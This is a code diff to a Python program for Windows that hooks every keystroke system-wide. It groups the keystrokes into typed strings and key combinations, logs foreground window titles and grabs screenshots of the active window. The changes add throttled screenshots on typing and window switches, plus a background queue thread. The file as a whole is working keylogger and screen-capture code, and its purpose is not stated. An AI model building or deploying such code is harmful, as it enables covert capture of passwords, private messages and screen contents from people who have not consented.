@@ -10,6 +10,8 @@ import sys
 
 PY2=sys.version_info[0]==2
 
+queue=__import__('Queue' if PY2 else 'queue')
+
 SPECIAL_KEYS={
     'Lcontrol','Lmenu','Lwin','Rcontrol','Rmenu','Rwin',
     'Escape','Snapshot','Home','End','Prior','Next','Return',
@@ -29,13 +31,21 @@ NICKNAME={
     'Oem_5': '\\', 'Oem_3': '`', 'Oem_2': '/', 'Oem_1': ';', 'Oem_7': "'", 'Oem_4': '[', 'Oem_6': ']',
 }
 STRING_TIMEOUT=2
+SCREENSHOT_THRESHOLD_TIME=.5
 RAM_ADDR=('127.0.0.1',48684)
+
+last_screenshot_time=0
 
 def screenshot():
     import win32gui
     from PIL import ImageGrab
     import base64
     from io import BytesIO
+
+    global last_screenshot_time
+    if time.time()-last_screenshot_time<SCREENSHOT_THRESHOLD_TIME:
+        return None
+    last_screenshot_time=time.time()
 
     hwnd=win32gui.GetForegroundWindow()
     img_file=BytesIO()
@@ -87,26 +97,34 @@ class Pumper:
                 time.sleep(1)
 
     def pump(self):
-        if self.msg is not None:
-            with self.lock:
+        with self.lock:
+            if self.msg is not None:
                 self.chunks.append(self.msg.json())
-            self.msg=None
+                self.msg=None
 
     def create(self,typ,value):
-        if self.msg is not None:
-            self.pump()
-        self.msg=Chunk(typ,value)
-
-    def breakout(self,typ,value):
+        self.pump()
         with self.lock:
-            self.chunks.append(Chunk(typ,value).json())
+            self.msg=Chunk(typ,value)
+
+    def img(self):
+        with self.lock:
+            if self.msg:
+                self.msg.image=screenshot()
+
+    def breakout(self,typ,value,img=False):
+        chk=Chunk(typ,value)
+        if img:
+            chk.image=screenshot()
+        with self.lock:
+            self.chunks.append(chk.json())
 
 pumper=Pumper()
 holdkey=set()
 last_time=0
-paused=False
 current_title=None
 status='idle'
+kqueue=queue.Queue()
 
 def hooker():
     hm=pyHook.HookManager()
@@ -116,43 +134,52 @@ def hooker():
     print('Started.')
     pythoncom.PumpMessages()
 
-def keydown(event):
+def worker(event):
     def proc():
         return NICKNAME.get(event.Key)
 
     global status
     global last_time
     global current_title
-    holdkey.add(event.Key)
-
-    if paused or event.Key in SHIFT:
-        return True
 
     window_name=(event.WindowName or '(None)').decode('gbk', 'ignore') if PY2 else (event.WindowName or '(None)')
     if current_title!=window_name:
         current_title=window_name
-        pumper.breakout('title', [event.Window,window_name])
+        pumper.breakout('title', [event.Window,window_name], img=True)
 
     if status=='string':
         if event.Key in SPECIAL_KEYS or time.time()-last_time>STRING_TIMEOUT:
             status='idle'
     if status=='idle':
-        status='modkey' if event.Key in SPECIAL_KEYS else 'string'
-        pumper.create(status,[] if status=='modkey' else '')
+        if event.Key in SPECIAL_KEYS:
+            status='modkey'
+            pumper.create(status,[])
+        else:
+            status='string'
+            pumper.create(status,'')
+            pumper.img()
 
     if status=='string':
         pumper.msg.value+=(proc() or (chr(event.Ascii) if event.Ascii else '⍰'))
-        if event.Key=='Return':
-            pumper.pump()
-            status='idle'
     else: #status=='modkey'
         if any((s in holdkey for s in SHIFT)):
             pumper.msg.value.append('Shift')
             for s in SHIFT:
                 holdkey.discard(s)
         pumper.msg.value.append(proc() or event.Key)
+        if event.Key=='Return':
+            pumper.img()
 
     last_time=time.time()
+
+def queue_finder():
+    while True:
+        worker(kqueue.get())
+
+def keydown(event):
+    holdkey.add(event.Key)
+    if event.Key not in SHIFT:
+        kqueue.put(event)
     return True
 
 def keyup(event):
@@ -165,4 +192,5 @@ def keyup(event):
 
 if __name__=='__main__':
     #print(len(screenshot()))
+    threading.Thread(target=queue_finder).start()
     hooker()
